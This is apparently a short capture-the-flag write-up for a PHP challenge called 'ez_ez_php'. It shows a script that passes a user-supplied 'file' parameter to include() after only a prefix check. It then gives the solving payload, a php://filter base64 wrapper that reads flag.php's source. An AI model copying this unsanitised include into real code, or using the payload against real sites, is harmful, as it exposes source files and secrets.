# <font style="color:rgb(48, 49, 51);">ez_ez_php</font>
```php
<?php
  error_reporting(0);
if (isset($_GET['file'])) {
  if ( substr($_GET["file"], 0, 3) === "php" ) {
    echo "Nice!!!";
    include($_GET["file"]);
  } 

  else {
    echo "Hacker!!";
  }
}else {
  highlight_file(__FILE__);
}
//flag.php
```

/?file=php://filter/read=convert.base64-encode/resource=flag.php

